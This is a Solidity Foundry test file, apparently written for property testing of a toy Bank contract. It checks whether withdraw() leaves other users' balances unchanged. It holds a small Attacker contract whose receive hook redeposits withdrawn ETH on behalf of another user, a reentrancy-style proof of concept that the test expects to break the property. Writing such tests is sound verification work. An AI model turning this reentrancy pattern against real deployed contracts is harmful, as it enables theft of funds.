pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "../Bank.sol";

// property: after a successful withdraw(amount), the balances of any user but the sender are preserved.

contract User {
    function doDeposit(Bank bank) external payable {
        bank.deposit{value: msg.value}();
    }
    receive() external payable {}
}

contract Attacker {
    Bank public bank;
    User public user;

    constructor(Bank _bank) {
        bank = _bank;
    }

    function setUser(User _user) external {
        user = _user;
    }

    // When receiving ETH from Bank.withdraw, forward it to User,
    // which deposits into Bank, crediting the User.
    receive() external payable {
        user.doDeposit{value: msg.value}(bank);
    }
}

contract BankTest is Test {       
    address immutable bank_deployer;      
    Bank immutable bank;
    
    constructor() {
        // deploying a Bank contract
        bank_deployer = address(0xBEEF);
	    vm.prank(bank_deployer);	    
	    bank = new Bank();
    }
    
    
    function test_withdraw_assets_credit_others_violation() public {

        User u = new User();
        Attacker a = new Attacker(bank);
        a.setUser(u);
        vm.deal(address(a), 1 ether);
        vm.prank(address(a));
        bank.deposit{value: 1 ether}();

	    address user = address(u);
        uint256 credits_slot = uint256(0);
        bytes32 user_credits_slot = keccak256(abi.encode(user, credits_slot));
        uint256 user_creditsBefore = uint256(vm.load(address(bank), user_credits_slot));

        uint256 amount = 1 ether;
        address sender = address(a);
        vm.prank(sender);
        bank.withdraw(amount); // should not revert
	
        uint256 user_creditsAfter = uint256(vm.load(address(bank), user_credits_slot));

        assertNotEq(sender, user, "user equal to sender");

        assertNotEq(user_creditsBefore, user_creditsAfter, "user credits did not change");
    }
}